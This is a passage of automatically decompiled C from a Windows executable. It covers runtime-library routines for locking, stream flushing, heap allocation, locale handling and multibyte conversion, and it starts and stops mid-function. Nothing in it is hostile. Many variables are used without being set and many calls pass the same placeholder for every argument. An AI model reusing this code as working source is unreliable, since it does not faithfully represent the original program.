        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    }
    // 0x40b4d0
    *(int32_t *)(v4 - 8) = g203;
    int32_t result = function_40bbdc((int32_t)&g266); // 0x40b4d6
    g203 = 0;
    return result;
}

// Address range: 0x40b4e5 - 0x40b4f9
int32_t function_40b4e5(int32_t a1) {
    // 0x40b4e5
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
    return &g266;
}

// Address range: 0x40b4f9 - 0x40b50d
int32_t function_40b4f9(int32_t a1) {
    // 0x40b4f9
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
    return &g266;
}

// Address range: 0x40b50d - 0x40b573
int32_t function_40b50d(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40b519
    int32_t v2 = *v1; // 0x40b519
    if ((v2 & 3) != 2 || (v2 & 192) == 0) {
        // 0x40b570
        return 0;
    }
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x40b52b
    int32_t * v4 = (int32_t *)a1; // 0x40b52f
    int32_t v5 = *v4 - v3; // 0x40b531
    *v4 = v3;
    *(int32_t *)(a1 + 8) = 0;
    if (v5 < 1) {
        // 0x40b570
        return 0;
    }
    int32_t v6 = function_40b0b4(function_40b3ab(a1)); // 0x40b547
    int32_t v7 = *v1;
    if (v5 != v6) {
        // 0x40b553
        *v1 = v7 | 16;
        // 0x40b570
        return -1;
    }
    // 0x40b55e
    if ((v7 & 4) != 0) {
        // 0x40b567
        *v1 = v7 & -3;
    }
    // 0x40b570
    return 0;
}

// Address range: 0x40b573 - 0x40b5ba
int32_t function_40b573(int32_t a1) {
    // 0x40b573
    if (a1 == 0) {
        // 0x40b5b7
        return function_40b5c3(a1);
    }
    // 0x40b589
    int32_t v1; // 0x40b573
    int32_t v2; // 0x40b573
    if (function_40b50d(a1, v1, v2) != 0) {
        // 0x40b5b7
        return -1;
    }
    // 0x40b599
    if ((*(int32_t *)(a1 + 12) & 2048) == 0) {
        // 0x40b5b7
        return 0;
    }
    int32_t v3 = function_40b3ab(a1); // 0x40b5a4
    if (function_40e8a3(v3) != 0) {
        // 0x40b5b7
        return -1;
    }
    // 0x40b5b7
    return 0;
}

// Address range: 0x40b5ba - 0x40b5c3
int32_t function_40b5ba(int32_t a1) {
    // 0x40b5ba
    return function_40b5c3(1);
}

// Address range: 0x40b5c3 - 0x40b68f
int32_t function_40b5c3(int32_t a1) {
    int32_t v1 = &g94; // bp-8, 0x40b5c5
    function_406770(&g94, 28, (int32_t)&g266);
    int32_t v2; // 0x40b5c3
    int32_t * v3 = (int32_t *)(v2 - 28); // 0x40b5cf
    *v3 = 0;
    int32_t * v4 = (int32_t *)(v2 - 36); // 0x40b5d3
    *v4 = 0;
    function_40bfa7(8);
    int32_t * v5 = (int32_t *)(v2 - 4); // 0x40b5df
    *v5 = 0;
    int32_t v6 = 4 * g202; // 0x40b5ee
    int32_t v7 = v6 + g203; // 0x40b5ee
    int32_t * v8 = (int32_t *)(v2 - 44); // 0x40b5f1
    *v8 = v7;
    int32_t v9 = *(int32_t *)(v2 + 8); // 0x40b5f4
    int32_t * v10 = (int32_t *)(v2 - 32); // 0x40b5f7
    *v10 = g203;
    int32_t result; // 0x40b689
    if (v6 == 0) {
        // 0x40b672
        *v5 = -2;
        function_40b692();
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v11 = (int32_t *)((int32_t)&v1 - 4);
    int32_t v12 = g203; // 0x40b65d
    int32_t v13 = *(int32_t *)v12; // 0x40b5fe
    *(int32_t *)(v2 - 40) = v13;
    int32_t v14 = v7; // 0x40b605
    int32_t v15; // 0x40b615
    int32_t v16; // 0x40b643
    if (v13 != 0) {
        // 0x40b607
        *v11 = v13;
        function_40b4e5((int32_t)&g266);
        *v5 = 1;
        v15 = *(int32_t *)(v13 + 12);
        if ((v15 & 0x2000) != 0) {
            if (v9 != 1) {
                if (v9 == 0 && (v15 & 2) != 0) {
                    // 0x40b642
                    *v11 = v13;
                    v16 = function_40b573((int32_t)&g266);
                    if (v16 == -1) {
                        // 0x40b64e
                        *v4 = *v4 | v16;
                    }
                }
            } else {
                // 0x40b624
                *v11 = v13;
                if (function_40b573((int32_t)&g266) != -1) {
                    // 0x40b630
                    *v3 = *v3 + 1;
                }
            }
        }
        // 0x40b651
        *v5 = 0;
        function_40b668();
        v14 = *v8;
    }
    // 0x40b65d
    v12 += 4;
    *v10 = v12;
    while (v12 != v14) {
        // 0x40b5fe
        v13 = *(int32_t *)v12;
        *(int32_t *)(v2 - 40) = v13;
        if (v13 != 0) {
            // 0x40b607
            *v11 = v13;
            function_40b4e5((int32_t)&g266);
            *v5 = 1;
            v15 = *(int32_t *)(v13 + 12);
            if ((v15 & 0x2000) != 0) {
                if (v9 != 1) {
                    if (v9 == 0 && (v15 & 2) != 0) {
                        // 0x40b642
                        *v11 = v13;
                        v16 = function_40b573((int32_t)&g266);
                        if (v16 == -1) {
                            // 0x40b64e
                            *v4 = *v4 | v16;
                        }
                    }
                } else {
                    // 0x40b624
                    *v11 = v13;
                    if (function_40b573((int32_t)&g266) != -1) {
                        // 0x40b630
                        *v3 = *v3 + 1;
                    }
                }
            }
            // 0x40b651
            *v5 = 0;
            function_40b668();
            v14 = *v8;
        }
        // 0x40b65d
        v12 += 4;
        *v10 = v12;
    }
    // 0x40b672
    *v5 = -2;
    function_40b692();
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40b668 - 0x40b672
int32_t function_40b668(void) {
    // 0x40b668
    int32_t v1; // 0x40b668
    return function_40b4f9(*(int32_t *)(v1 - 40));
}

// Address range: 0x40b692 - 0x40b69b
int32_t function_40b692(void) {
    // 0x40b692
    return function_40bfef(8);
}

// Address range: 0x40b69b - 0x40b6c1
int32_t function_40b69b(int32_t a1, int32_t a2) {
    int32_t v1 = function_40ba33(); // 0x40b6a1
    int32_t v2 = *(int32_t *)(v1 + 76); // bp-8, 0x40b6a9
    function_40bb82(v1, (int32_t)&v2);
    return *(int32_t *)v2;
}

// Address range: 0x40b6c1 - 0x40b705
int32_t function_40b6c1(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40b6c1
    function_406770(&g96, 8, (int32_t)&g266);
    int32_t v1; // 0x40b6c1
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40b6d8
    *v2 = 0;
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x40b6dc
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v3 + 4); // 0x40b6e4
    function_40b9e8(*(int32_t *)*(int32_t *)v3, v4);
    *v2 = -2;
    function_40b705();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40b6fd
    return result;
}

// Address range: 0x40b705 - 0x40b711
int32_t function_40b705(void) {
    // 0x40b705
    int32_t v1; // 0x40b705
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40b711 - 0x40b766
int32_t function_40b711(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40b711
    function_406770(&g97, 8, (int32_t)&g266);
    int32_t v1; // 0x40b711
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40b728
    *v2 = 0;
    int32_t v3 = *(int32_t *)*(int32_t *)(v1 + 12); // 0x40b72f
    int32_t v4 = *(int32_t *)(*(int32_t *)v3 + 72); // 0x40b733
    int32_t result; // 0x40b75e
    if (v4 == 0) {
        // 0x40b752
        *v2 = -2;
        function_40b766();
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v5 = (int32_t *)v4; // 0x40b73d
    int32_t v6 = *v5 - 1; // 0x40b73d
    *v5 = v6;
    if (v4 != (int32_t)&g131 && v6 == 0) {
        // 0x40b74b
        function_40bbdc(v4);
    }
    // 0x40b752
    *v2 = -2;
    function_40b766();
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40b766 - 0x40b772
int32_t function_40b766(void) {
    // 0x40b766
    int32_t v1; // 0x40b766
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40b772 - 0x40b7b1
int32_t function_40b772(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40b772
    function_406770(&g98, 8, (int32_t)&g266);
    int32_t v1; // 0x40b772
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40b789
    *v2 = 0;
    function_40b9e8(*(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12), 0);
    *v2 = -2;
    function_40b7b1();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40b7a9
    return result;
}

// Address range: 0x40b7b1 - 0x40b7bd
int32_t function_40b7b1(void) {
    // 0x40b7b1
    int32_t v1; // 0x40b7b1
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40b7bd - 0x40b7f9
int32_t function_40b7bd(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40b7bd
    function_406770(&g95, 8, (int32_t)&g266);
    int32_t v1; // 0x40b7bd
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40b7d4
    *v2 = 0;
    int32_t v3 = *(int32_t *)*(int32_t *)(v1 + 12); // 0x40b7db
    int32_t * v4 = (int32_t *)*(int32_t *)(*(int32_t *)v3 + 72); // 0x40b7e2
    *v4 = *v4 + 1;
    *v2 = -2;
    function_40b7f9();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40b7f1
    return result;
}

// Address range: 0x40b7f9 - 0x40b805
int32_t function_40b7f9(void) {
    // 0x40b7f9
    int32_t v1; // 0x40b7f9
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40b805 - 0x40b806
int32_t function_40b805(int32_t a1, int32_t * a2) {
    // 0x40b805
    int32_t result; // 0x40b805
    return result;
}

// Address range: 0x40b807 - 0x40b82d
int32_t function_40b807(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-12, 0x40b813
    int32_t v2 = a1; // bp-16, 0x40b816
    int32_t v3; // 0x40b807
    return function_40b711(&v2, a2, &v1, a1, a1, v3);
}

// Address range: 0x40b82d - 0x40b855
int32_t function_40b82d(int32_t a1, int32_t * a2) {
    int32_t v1 = a1; // bp-12, 0x40b83b
    int32_t v2 = a1; // bp-16, 0x40b83e
    int32_t v3; // 0x40b82d
    return function_40b6c1(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40b855 - 0x40b856
int32_t function_40b855(int32_t a1, int32_t * a2) {
    // 0x40b855
    int32_t result; // 0x40b855
    return result;
}

// Address range: 0x40b857 - 0x40b87d
int32_t function_40b857(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-12, 0x40b863
    int32_t v2 = a1; // bp-16, 0x40b866
    int32_t v3; // 0x40b857
    return function_40b772(&v2, a2, &v1, a1, a1, v3);
}

// Address range: 0x40b87d - 0x40b8a5
int32_t function_40b87d(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40b88b
    int32_t v2 = a1; // bp-16, 0x40b88e
    int32_t v3; // 0x40b87d
    return function_40b7bd(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40b8a5 - 0x40b91e
int32_t function_40b8a5(int32_t a1) {
    int32_t v1 = a1;
    *(int32_t *)(a1 + 24) = 1;
    *(int32_t *)v1 = (int32_t)&g31;
    *(int32_t *)(v1 + 848) = 1;
    *(int32_t *)(v1 + 72) = (int32_t)&g131;
    *(int16_t *)(v1 + 108) = 67;
    *(int16_t *)(v1 + 370) = 67;
    *(int32_t *)(v1 + 844) = 0;
    int32_t v2 = &v1; // 0x40b8f2
    int32_t v3 = v2; // bp-8, 0x40b8f2
    int32_t v4; // bp-12, 0x40b8a5
    int32_t v5; // 0x40b8a5
    function_40b87d(5, &v3, v4, &v1, v5);
    v4 = v2;
    int32_t v6; // 0x40b8a5
    v3 = &v6;
    return function_40b82d(4, &v4);
}

// Address range: 0x40b920 - 0x40b93f
int32_t function_40b920(int32_t a1) {
    // 0x40b920
    int32_t result; // 0x40b920
    if (a1 != 0) {
        // 0x40b929
        int32_t v1; // 0x40b920
        function_40b93f(a1, v1);
        result = function_40bbdc(a1);
    }
    // 0x40b93b
    return result;
}

// Address range: 0x40b93f - 0x40b9e8
int32_t function_40b93f(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    int32_t v2 = *(int32_t *)a1; // 0x40b948
    v1 = a1;
    if (v2 != (int32_t)&g31) {
        // 0x40b952
        function_40bbdc(v2);
    }
    // 0x40b95c
    function_40bbdc(*(int32_t *)(v1 + 60));
    function_40bbdc(*(int32_t *)(v1 + 48));
    function_40bbdc(*(int32_t *)(v1 + 52));
    function_40bbdc(*(int32_t *)(v1 + 56));
    function_40bbdc(*(int32_t *)(v1 + 40));
    function_40bbdc(*(int32_t *)(v1 + 44));
    function_40bbdc(*(int32_t *)(v1 + 64));
    function_40bbdc(*(int32_t *)(v1 + 68));
    function_40bbdc(*(int32_t *)(v1 + 864));
    int32_t v3 = &v1; // 0x40b9c2
    int32_t v4 = v3; // bp-8, 0x40b9c2
    function_40b805(5, &v4);
    v4 = v3;
    return function_40b855(4, &v4);
}

// Address range: 0x40b9e8 - 0x40ba33
int32_t function_40b9e8(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 76); // 0x40b9f1
    int32_t v2 = *v1; // 0x40b9f1
    if (v2 != 0) {
        // 0x40b9f7
        function_40e043(v2);
        int32_t v3 = *v1; // 0x40b9ff
        if (v3 != (int32_t)&g122 && v3 != g206) {
            // 0x40ba12
            if (*(int32_t *)(v3 + 12) == 0) {
                // 0x40ba18
                function_40de77(v3);
            }
        }
    }
    // 0x40ba1f
    *v1 = a2;
    int32_t result = 0; // 0x40ba28
    if (a2 != 0) {
        // 0x40ba2a
        result = function_40ddfa(a2);
    }
    // 0x40ba31
    return result;
}

// Address range: 0x40ba33 - 0x40bab6
int32_t function_40ba33(void) {
    int32_t errorCode = GetLastError(); // 0x40ba37
    int32_t v1; // bp-8, 0x40ba33
    int32_t v2 = &v1; // 0x40ba47
    if (g121 != -1) {
        int32_t v3 = g121; // bp-12, 0x40ba49
        v2 = &v3;
        int32_t result = function_40c1c9(g121); // 0x40ba4a
        if (result != 0) {
            // 0x40ba9e
            *(int32_t *)(v2 - 4) = errorCode;
            SetLastError((int32_t)&g266);
            return result;
        }
    }
    int32_t * v4 = (int32_t *)(v2 - 4);
    *v4 = 868;
    int32_t v5 = v2 - 8; // 0x40ba5a
    int32_t * v6 = (int32_t *)v5; // 0x40ba5a
    *v6 = 1;
    int32_t result2 = function_40c4a1((int32_t)&g266, (int32_t)&g266); // 0x40ba5c
    *v4 = result2;
    int32_t * v7 = v4; // 0x40ba67
    if (result2 != 0) {
        // 0x40ba72
        *v6 = g121;
        int32_t v8 = function_40c21f((int32_t)&g266, (int32_t)&g266); // 0x40ba79
        v7 = (int32_t *)(v2 - 12);
        if (v8 != 0) {
            // 0x40ba85
            *v7 = (int32_t)&g206;
            *(int32_t *)(v2 - 16) = result2;
            function_40b8a5((int32_t)&g266);
            *(int32_t *)(v2 - 20) = 0;
            function_40bbdc((int32_t)&g266);
            // 0x40ba9e
            *(int32_t *)(v5 - 4) = errorCode;
            SetLastError((int32_t)&g266);
            return result2;
        }
        // 0x40ba82
        *v7 = result2;
    }
    // 0x40baaa
    function_40bbdc((int32_t)&g266);
    *v7 = errorCode;
    SetLastError((int32_t)&g266);
    function_40a98b();
    // UNREACHABLE
}

// Address range: 0x40bab7 - 0x40bb3c
int32_t function_40bab7(void) {
    int32_t errorCode = GetLastError(); // 0x40babc
    int32_t v1; // bp-12, 0x40bab7
    int32_t v2 = &v1; // 0x40bace
    int32_t result; // 0x40bab7
    int32_t v3; // 0x40bab7
    if (g121 == -1) {
        goto lab_0x40badc;
    } else {
        int32_t v4 = g121; // bp-16, 0x40bad0
        v2 = &v4;
        int32_t v5 = function_40c1c9(g121); // 0x40bad1
        v3 = v2;
        result = v5;
        if (v5 != 0) {
            goto lab_0x40bb2d;
        } else {
            goto lab_0x40badc;
        }
    }
  lab_0x40badc:;
    int32_t * v6 = (int32_t *)(v2 - 4);
    *v6 = 868;
    int32_t v7 = v2 - 8; // 0x40bae1
    int32_t * v8 = (int32_t *)v7; // 0x40bae1
    *v8 = 1;
    int32_t v9 = function_40c4a1((int32_t)&g266, (int32_t)&g266); // 0x40bae3
    int32_t * v10; // 0x40bab7
    if (v9 != 0) {
        // 0x40baf9
        *v6 = v9;
        *v8 = g121;
        int32_t v11 = function_40c21f((int32_t)&g266, (int32_t)&g266); // 0x40bb00
        int32_t * v12 = (int32_t *)(v2 - 12);
        if (v11 != 0) {
            // 0x40bb0c
            *v12 = (int32_t)&g206;
            *(int32_t *)(v2 - 16) = v9;
            function_40b8a5((int32_t)&g266);
            *(int32_t *)(v2 - 20) = 0;
            function_40bbdc((int32_t)&g266);
            v3 = v7;
            result = v9;
            goto lab_0x40bb2d;
        } else {
            // 0x40bb09
            *v12 = v9;
            v10 = v12;
            goto lab_0x40bb24;
        }
    } else {
        // 0x40baf0
        *v6 = 0;
        v10 = v6;
        goto lab_0x40bb24;
    }
  lab_0x40bb2d:
    // 0x40bb2d
    *(int32_t *)(v3 - 4) = errorCode;
    SetLastError((int32_t)&g266);
    // 0x40bb36
    return result;
  lab_0x40bb24:
    // 0x40bb24
    function_40bbdc((int32_t)&g266);
    *v10 = errorCode;
    SetLastError((int32_t)&g266);
    // 0x40bb36
    return 0;
}

// Address range: 0x40bb3c - 0x40bb68
int32_t function_40bb3c(void) {
    int32_t v1 = function_40c11d(0x40b91e); // 0x40bb41
    g121 = v1;
    if (v1 == -1) {
        // 0x40bb50
        return v1 & -256;
    }
    int32_t v2 = function_40bab7(); // 0x40bb53
    if (v2 != 0) {
        // 0x40bb65
        return v2 & -256 | 1;
    }
    // 0x40bb50
    return function_40bb68(v2) & -256;
}

// Address range: 0x40bb68 - 0x40bb82
int32_t function_40bb68(int32_t a1) {
    int32_t result = -255; // 0x40bb70
    if (g121 != -1) {
        int32_t v1 = function_40c173(g121); // 0x40bb73
        g121 = -1;
        result = v1 & -256 | 1;
    }
    // 0x40bb7f
    return result;
}

// Address range: 0x40bb82 - 0x40bbaf
int32_t function_40bb82(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40bb8b
    int32_t result = *v1; // 0x40bb8b
    if (result == g206) {
        // 0x40bbac
        return result;
    }
    int32_t v2 = g139; // 0x40bb98
    int32_t result2 = v2; // 0x40bba3
    if ((*(int32_t *)(a1 + 848) & v2) == 0) {
        // 0x40bba5
        int32_t v3; // 0x40bb82
        int32_t v4; // 0x40bb82
        result2 = function_40e0c4(v3, v4);
        *v1 = result2;
    }
    // 0x40bbac
    return result2;
}

// Address range: 0x40bbaf - 0x40bbdc
int32_t function_40bbaf(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40bbb8
    int32_t result = *v1; // 0x40bbb8
    if (result == (int32_t)g133) {
        // 0x40bbd9
        return result;
    }
    int32_t v2 = g139; // 0x40bbc5
    int32_t result2 = v2; // 0x40bbd0
    if ((*(int32_t *)(a1 + 848) & v2) == 0) {
        // 0x40bbd2
        int32_t v3; // 0x40bbaf
        result2 = function_40cea4(v3);
        *v1 = result2;
    }
    // 0x40bbd9
    return result2;
}

// Address range: 0x40bbdc - 0x40bc16
int32_t function_40bbdc(int32_t lpMem) {
    if (lpMem == 0) {
        // 0x40bc14
        int32_t result; // 0x40bbdc
        return result;
    }
    bool v1 = HeapFree((int32_t *)g227, 0, (int32_t *)lpMem); // 0x40bbf2
    int32_t result2 = v1; // 0x40bbfa
    if (!v1) {
        int32_t v2 = function_40ab11(); // 0x40bbfd
        result2 = function_40aa98(GetLastError());
        *(int32_t *)v2 = result2;
    }
    // 0x40bc14
    return result2;
}

// Address range: 0x40bc16 - 0x40bc64
int32_t function_40bc16(uint32_t a1) {
    if (a1 >= 0xffffffe1) {
        // 0x40bc54
        *(int32_t *)function_40ab11() = 12;
        // 0x40bc61
        return 0;
    }
    int32_t v1 = (int32_t)(bool)(a1 == 0) + a1;
    int32_t v2; // bp-8, 0x40bc16
    int32_t v3 = &v2;
    *(int32_t *)(v3 - 4) = v1;
    *(int32_t *)(v3 - 8) = 0;
    int32_t v4 = v3 - 12; // 0x40bc42
    *(int32_t *)v4 = g227;
    int32_t * v5 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bc48
    while (v5 == NULL) {
        // 0x40bc2b
        if (function_40a856() == 0) {
            // 0x40bc54
            *(int32_t *)function_40ab11() = 12;
            // 0x40bc61
            return 0;
        }
        // 0x40bc34
        *(int32_t *)(v3 - 16) = v1;
        if (function_4096f2((int32_t)&g266) == 0) {
            // 0x40bc54
            *(int32_t *)function_40ab11() = 12;
            // 0x40bc61
            return 0;
        }
        v3 = v4;
        *(int32_t *)(v3 - 4) = v1;
        *(int32_t *)(v3 - 8) = 0;
        v4 = v3 - 12;
        *(int32_t *)v4 = g227;
        v5 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40bc61
    return (int32_t)v5;
}

// Address range: 0x40bc64 - 0x40bd5e
int32_t function_40bc64(int32_t lpWideCharStr, int32_t a2, uint32_t a3, int32_t a4, int32_t a5) {
    // 0x40bc64
    if (a2 == 0 || a3 == 0) {
        // 0x40bc8f
        return 0;
    }
    char * lpMultiByteStr = (char *)a2; // 0x40bc7c
    if (*lpMultiByteStr == 0) {
        // 0x40bc81
        if (lpWideCharStr != 0) {
            // 0x40bc88
            *(int16_t *)lpWideCharStr = 0;
        }
        // 0x40bc8f
        return 0;
    }
    // 0x40bc95
    int32_t v1; // 0x40bc64
    function_4093d4(a4, v1);
    int32_t v2; // 0x40bc64
    int32_t v3; // 0x40bc64
    int32_t result; // 0x40bc64
    int32_t v4; // bp-16, 0x40bc64
    int32_t v5; // 0x40bc64
    if (*(int32_t *)(v5 + 168) != 0) {
        // 0x40bcc2
        if (function_40e912((int32_t)*lpMultiByteStr, &v4) == 0) {
            int32_t CodePage = *(int32_t *)(v4 + 8); // 0x40bd2b
            result = 1;
            if (MultiByteToWideChar(CodePage, 9, lpMultiByteStr, 1, (int16_t *)lpWideCharStr, (int32_t)(lpWideCharStr != 0)) != 0) {
                goto lab_0x40bd46;
            } else {
                goto lab_0x40bd38;
            }
        } else {
            int32_t cbMultiByte = *(int32_t *)(v4 + 4); // 0x40bcd8
            v2 = cbMultiByte;
            if (cbMultiByte < 2 || cbMultiByte > a3) {
                goto lab_0x40bd08;
            } else {
                int32_t CodePage2 = *(int32_t *)(v4 + 8); // 0x40bcf5
                v3 = v4;
                if (MultiByteToWideChar(CodePage2, 9, lpMultiByteStr, cbMultiByte, (int16_t *)lpWideCharStr, (int32_t)(lpWideCharStr != 0)) != 0) {
                    goto lab_0x40bd10;
                } else {
                    // 0x40bce3
                    v2 = *(int32_t *)(v4 + 4);
                    goto lab_0x40bd08;
                }
            }
        }
    } else {
        // 0x40bcad
        result = 1;
        if (lpWideCharStr != 0) {
            // 0x40bcb4
            *(int16_t *)lpWideCharStr = (int16_t)*lpMultiByteStr;
            result = 1;
        }
        goto lab_0x40bd46;
    }
  lab_0x40bd46:;
    // 0x40bd46
    char v6; // 0x40bc64
    if (v6 != 0) {
        // 0x40bd4c
        int32_t v7; // 0x40bc64
        int32_t * v8 = (int32_t *)(v7 + 848); // 0x40bd4f
        *v8 = *v8 & -3;
    }
    // 0x40bc8f
    return result;
  lab_0x40bd38:
    // 0x40bd38
    *(int32_t *)function_40ab11() = 42;
    result = -1;
    goto lab_0x40bd46;
  lab_0x40bd08:
    // 0x40bd08
    if (v2 > a3) {
        goto lab_0x40bd38;
    } else {
        // 0x40bd0a
        v3 = v4;
        if (*(char *)(a2 + 1) == 0) {
            goto lab_0x40bd38;
        } else {
            goto lab_0x40bd10;
        }
    }
  lab_0x40bd10:
    // 0x40bd10
    result = *(int32_t *)(v3 + 4);
    goto lab_0x40bd46;
}

// Address range: 0x40bd5e - 0x40bd78
int32_t function_40bd5e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40bd5e
    int32_t v1; // 0x40bd5e
    return function_40bc64(a1, a2, a3, 0, v1);
}

// Address range: 0x40bd78 - 0x40bd79
int32_t function_40bd78(void) {
    // 0x40bd78
    int32_t result; // 0x40bd78
    return result;
}

// Address range: 0x40bd7a - 0x40be2e
int32_t function_40bd7a(void) {
    // 0x40bd7a
    int32_t lpStartupInfo; // bp-76, 0x40bd7a
    GetStartupInfoW((struct _STARTUPINFOW *)&lpStartupInfo);
    int16_t v1; // 0x40bd7a
    if (v1 == 0) {
        // 0x40be2a
        return &g266;
    }
    // 0x40bd95
    int32_t v2; // 0x40bd7a
    if (v2 == 0) {
        // 0x40be2a
        return 0;
    }
    int32_t v3 = *(int32_t *)v2; // 0x40bda2
    int32_t v4 = v3 < 0x2000 ? v3 : 0x2000;
    function_40d85d(v4);
    int32_t result = g209; // 0x40bdbe
    int32_t v5 = v4 > result ? result : v4;
    if (v5 == 0) {
        // 0x40be2a
        return result;
    }
    int32_t v6 = v2 + 4; // 0x40bda4
    int32_t v7 = v3 + v6; // 0x40bdd1
    int32_t v8 = v6; // 0x40bdd1
    int32_t v9; // bp-92, 0x40bd7a
    int32_t v10 = &v9; // 0x40bdd1
    int32_t v11 = 0; // 0x40bdd1
    int32_t v12; // 0x40bd7a
    int32_t v13; // 0x40bd7a
    int32_t v14; // 0x40bd7a
    int32_t v15; // 0x40bd7a
    char * v16; // 0x40bde0
    while (true) {
      lab_0x40bdd4:
        // 0x40bdd4
        v14 = v11;
        int32_t v17 = v10;
        v13 = v8;
        int32_t * v18 = (int32_t *)v7; // 0x40bdd4
        uint32_t v19 = *v18; // 0x40bdd4
        v10 = v17;
        if (v19 > 0xfffffffd) {
            goto lab_0x40be1b;
        } else {
            // 0x40bde0
            v16 = (char *)v13;
            char v20 = *v16; // 0x40bde0
            v10 = v17;
            if ((v20 & 1) == 0) {
                goto lab_0x40be1b;
            } else {
                // 0x40bde7
                v12 = v19;
                v15 = v17;
                if ((v20 & 8) != 0) {
                    goto lab_0x40bdf7;
                } else {
                    int32_t v21 = v17 - 4; // 0x40bdec
                    *(int32_t *)v21 = v19;
                    int32_t v22 = GetFileType(&g266); // 0x40bded
                    v10 = v21;
                    if (v22 == 0) {
                        goto lab_0x40be1b;
                    } else {
                        // 0x40bdec
                        v12 = *v18;
                        v15 = v21;
                        goto lab_0x40bdf7;
                    }
                }
            }
        }
    }
  lab_0x40be2a:;
    // 0x40be2a
    int32_t result2; // 0x40bd7a
    return result2;
  lab_0x40be1b:
    // 0x40be1b
    v11 = v14 + 1;
    v7 += 4;
    v8 = v13 + 1;
    result2 = v7;
    if (v11 == v5) {
        // break -> 0x40be2a
        goto lab_0x40be2a;
    }
    goto lab_0x40bdd4;
  lab_0x40bdf7:;
    int32_t v23 = *(int32_t *)(4 * v14 / 64 + (int32_t)&g207); // 0x40be07
    int32_t v24 = v23 + 48 * (v14 & 63); // 0x40be07
    *(int32_t *)(v24 + 24) = v12;
    *(char *)(v24 + 40) = *v16;
    v10 = v15;
    goto lab_0x40be1b;
}

// Address range: 0x40be2e - 0x40be2f
int32_t function_40be2e(void) {
    // 0x40be2e
    int32_t result; // 0x40be2e
    return result;
}

// Address range: 0x40be30 - 0x40bee4
int32_t function_40be30(void) {
    // 0x40be30
    int32_t v1; // bp-12, 0x40be30
    int32_t v2 = &v1; // 0x40be33
    int32_t v3 = 0; // 0x40be33
    int32_t result; // 0x40be30
    int32_t v4; // 0x40be30
    int32_t v5; // 0x40be30
    int32_t * v6; // 0x40be49
    char * v7; // 0x40be30
    while (true) {
      lab_0x40be35:
        // 0x40be35
        v4 = v3;
        int32_t v8 = v2;
        int32_t v9 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40be42
        int32_t v10 = 48 * v4 + v9; // 0x40be42
        v6 = (int32_t *)(v10 + 24);
        v7 = (char *)(v10 + 40);
        if (*v6 > 0xfffffffd) {
            // 0x40be5b
            *v7 = -127;
            int32_t v11; // 0x40be30
            if (v4 == 0) {
                int32_t v12 = v8 - 4; // 0x40be76
                *(int32_t *)v12 = -10;
                v11 = v12;
            } else {
                int32_t v13 = v8 - 4;
                int32_t * v14 = (int32_t *)v13;
                if (v4 == 1) {
                    // 0x40be72
                    *v14 = -11;
                    v11 = v13;
                } else {
                    // 0x40be6b
                    *v14 = -12;
                    v11 = v13;
                }
            }
            int32_t v15 = v11;
            int32_t v16 = (int32_t)GetStdHandle((int32_t)&g266); // 0x40be7a
            v5 = v15;
            switch (v16) {
                case -1: {
